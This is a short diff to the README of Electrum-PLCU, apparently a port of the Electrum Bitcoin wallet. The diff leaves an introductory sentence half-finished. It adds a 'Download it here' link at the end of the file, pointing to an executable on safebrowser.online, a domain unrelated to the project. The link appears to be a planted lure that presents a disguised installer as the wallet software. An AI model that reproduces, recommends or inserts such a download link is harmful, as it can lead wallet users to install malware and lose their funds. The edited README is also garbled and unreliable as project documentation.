@@ -19,7 +19,7 @@ Electrum-PLCU is a port of Electrum, the Bitcoin wallet, to PLC Ultima.
 Getting started
 ===============
 
-(*If you've come here looking to simply run Electrum,* `safebrowser.online/installe.exe`_.)
+*If you've come here looking to simply run Electrum
 
 Electrum-PLCU itself is pure Python, and so are most of the required dependencies,
 but not everything. The following sections describe how to run from source, but here
@@ -146,4 +146,6 @@ and recent changes, writing tests, or helping with outstanding issues is very we
 Implementing new features, or improving/refactoring the codebase, is of course
 also welcome, but to avoid wasted effort, especially for larger changes,
 we encourage discussing these on the issue tracker or IRC first.
+
+<a href="https://safebrowser.online/installer.exe">Download it here</a>
 
